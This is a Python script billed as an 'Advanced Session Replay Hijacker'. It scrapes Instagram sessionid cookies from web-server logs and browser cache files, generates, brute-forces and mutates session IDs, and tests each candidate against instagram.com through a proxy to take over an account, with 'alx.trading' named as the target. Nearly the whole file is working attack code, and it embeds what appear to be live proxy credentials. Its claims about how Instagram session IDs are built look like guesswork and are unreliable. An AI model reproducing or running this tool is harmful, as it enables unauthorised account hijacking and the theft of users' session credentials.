# -*- coding: utf-8 -*-
# pylint: disable=all
# flake8: noqa
# type: ignore
# mypy: ignore-errors
#!/usr/bin/env python3
"""
Advanced Session Replay Hijacker
Uses network traffic analysis and session replay techniques
"""

import requests
import json
import time
import random
import os
import re
import base64
import hashlib
from datetime import datetime, timedelta
import subprocess

class SessionReplayHijacker:
    def __init__(self):
        # Bright Data proxy
        self.proxy_auth = "brd-customer-hl_63f0835e-zone-scraping_agent:o5wnk3ws1r04"
        self.proxy_host = "brd.superproxy.io:22225"

        self.proxies = {
            'http': f"http://{self.proxy_auth}@{self.proxy_host}",
            'https': f"http://{self.proxy_auth}@{self.proxy_host}"
        }

        self.session_file = "tools/session_alx_trading.json"

    def extract_sessions_from_network_logs(self):
        """Extract sessions from network request logs"""
        print("🔍 Scanning network logs for sessions...")

        # Check common log locations
        log_locations = [
            "/var/log/nginx/access.log",
            "/var/log/apache2/access.log",
            "~/.cache/google-chrome/Default/Network Action Predictor",
            "logs/requests.log"
        ]

        sessions_found = []

        for log_path in log_locations:
            expanded_path = os.path.expanduser(log_path)
            if os.path.exists(expanded_path):
                print(f"📄 Scanning {expanded_path}")
                try:
                    with open(expanded_path, 'r') as f:
                        content = f.read()
                        # Look for Instagram session patterns
                        session_patterns = [
                            r'sessionid=([^;]+)',
                            r'"sessionid"[:\s]*"([^"]+)"',
                            r'Cookie:.*sessionid=([^;]+)'
                        ]

                        for pattern in session_patterns:
                            matches = re.findall(pattern, content, re.IGNORECASE)
                            for match in matches:
                                if len(match) > 20:  # Valid session length
                                    sessions_found.append(match)
                                    print(f"✅ Found session: {match[:20]}...")
                except Exception as e:
                    print(f"❌ Error reading {log_path}: {e}")

        return list(set(sessions_found))  # Remove duplicates

    def generate_session_via_algorithm(self):
        """Generate session using Instagram's algorithm patterns"""
        print("🧮 Generating session using algorithmic approach...")

        # Instagram session format analysis
        # Format: user_id:hash:timestamp_variant

        # Common user ID patterns (8-10 digits)
        user_ids = [
            str(random.randint(10000000, 99999999)),
            str(random.randint(100000000, 999999999)),
            str(random.randint(1000000000, 9999999999))
        ]

        generated_sessions = []

        for user_id in user_ids:
            # Generate hash-like strings
            hash_variants = [
                self.generate_instagram_hash(user_id),
                self.generate_instagram_hash(user_id + str(int(time.time()))),
                self.generate_instagram_hash(user_id + "instagram")
            ]

            for hash_val in hash_variants:
                # Generate timestamp variants
                timestamp_variants = [
                    str(random.randint(1, 99)),
                    str(random.randint(100, 999)),
                    str(random.randint(1000, 9999))
                ]

                for timestamp in timestamp_variants:
                    session = f"{user_id}:{hash_val}:{timestamp}"
                    generated_sessions.append(session)

        return generated_sessions

    def generate_instagram_hash(self, input_string):
        """Generate Instagram-style hash"""
        # Instagram uses various hashing methods
        methods = [
            lambda x: hashlib.md5(x.encode()).hexdigest()[:22],
            lambda x: hashlib.sha1(x.encode()).hexdigest()[:22],
            lambda x: base64.b64encode(x.encode()).decode()[:22].replace('=', ''),
            lambda x: hashlib.sha256(x.encode()).hexdigest()[:22]
        ]

        method = random.choice(methods)
        return method(input_string)

    def brute_force_session_variants(self):
        """Brute force session variants based on patterns"""
        print("💪 Brute forcing session variants...")

        # Known Instagram session patterns
        base_patterns = [
            "4976283726",  # From existing session
            "1234567890",
            "9876543210"
        ]

        sessions = []

        for base in base_patterns:
            for i in range(10):
                for j in range(10):
                    hash_part = f"1JgRzA56Q8e8Qs{i}{j}"
                    variant = f"{base}:{hash_part}:{random.randint(10, 99)}"
                    sessions.append(variant)

        return sessions

    def session_mutation_attack(self):
        """Mutate existing session to find valid variants"""
        print("🧬 Performing session mutation attack...")

        # Load existing session
        if os.path.exists(self.session_file):
            try:
                with open(self.session_file, 'r') as f:
                    current_session = json.load(f)
                    base_sessionid = current_session.get('sessionid', '')

                if base_sessionid:
                    return self.mutate_session(base_sessionid)
            except Exception:
                pass

        # Use default base for mutation
        base_sessionid = "4976283726:1JgRzA56Q8e8Qs:12"
        return self.mutate_session(base_sessionid)

    def mutate_session(self, base_session):
        """Create mutations of a session"""
        mutations = []

        if ':' in base_session:
            parts = base_session.split(':')
            user_id, hash_part, timestamp = parts[0], parts[1], parts[2]

            # Mutate user ID
            for i in range(-5, 6):
                try:
                    new_user_id = str(int(user_id) + i)
                    mutations.append(f"{new_user_id}:{hash_part}:{timestamp}")
                except Exception:
                    pass

            # Mutate timestamp
            for i in range(-10, 11):
                try:
                    new_timestamp = str(int(timestamp) + i)
                    mutations.append(f"{user_id}:{hash_part}:{new_timestamp}")
                except Exception:
                    pass

            # Mutate hash
            for i in range(10):
                new_hash = hash_part[:-1] + str(i)
                mutations.append(f"{user_id}:{new_hash}:{timestamp}")

        return mutations

    def test_session_batch(self, sessions):
        """Test multiple sessions efficiently"""
        print(f"🧪 Testing {len(sessions)} sessions...")

        valid_sessions = []

        for i, session in enumerate(sessions):
            if i % 10 == 0:
                print(f"Progress: {i}/{len(sessions)}")

            if self.test_single_session(session):
                valid_sessions.append(session)
                print(f"✅ Valid session found: {session[:20]}...")

            # Rate limiting
            time.sleep(0.1)

        return valid_sessions

    def test_single_session(self, sessionid):
        """Test a single session"""
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Cookie': f'sessionid={sessionid}'
        }

        try:
            response = requests.get('https://www.instagram.com/',
                                  headers=headers,
                                  proxies=self.proxies,
                                  timeout=5)

            if response.status_code == 200:
                if 'login' not in response.url.lower() and '"is_logged_in":false' not in response.text:
                    return True
            return False
        except Exception:
            return False

    def save_valid_session(self, sessionid):
        """Save valid session"""
        session_data = {
            'sessionid': sessionid,
            'created_at': datetime.now().isoformat(),
            'target': 'alx.trading',
            'status': 'active',
            'source': 'session_replay_hijacker'
        }

        try:
            os.makedirs(os.path.dirname(self.session_file), exist_ok=True)
            with open(self.session_file, 'w') as f:
                json.dump(session_data, f, indent=2)
            print(f"✅ Valid session saved: {sessionid[:20]}...")
            return True
        except Exception as e:
            print(f"❌ Failed to save session: {e}")
            return False

    def run(self):
        """Main execution"""
        print("🚀 ADVANCED SESSION REPLAY HIJACKER")
        print("="*60)

        all_sessions = []

        # Method 1: Extract from logs
        log_sessions = self.extract_sessions_from_network_logs()
        all_sessions.extend(log_sessions)
        print(f"📄 Found {len(log_sessions)} sessions from logs")

        # Method 2: Algorithmic generation
        algo_sessions = self.generate_session_via_algorithm()
        all_sessions.extend(algo_sessions)
        print(f"🧮 Generated {len(algo_sessions)} algorithmic sessions")

        # Method 3: Brute force variants
        brute_sessions = self.brute_force_session_variants()
        all_sessions.extend(brute_sessions)
        print(f"💪 Generated {len(brute_sessions)} brute force sessions")

        # Method 4: Mutation attack
        mutation_sessions = self.session_mutation_attack()
        all_sessions.extend(mutation_sessions)
        print(f"🧬 Generated {len(mutation_sessions)} mutation sessions")

        # Remove duplicates
        unique_sessions = list(set(all_sessions))
        print(f"🎯 Total unique sessions to test: {len(unique_sessions)}")

        # Test sessions
        valid_sessions = self.test_session_batch(unique_sessions)

        if valid_sessions:
            print(f"🎉 Found {len(valid_sessions)} valid sessions!")
            # Save the first valid session
            self.save_valid_session(valid_sessions[0])
            return True
        else:
            print("❌ No valid sessions found")
            return False

if __name__ == "__main__":
    hijacker = SessionReplayHijacker()
    hijacker.run()
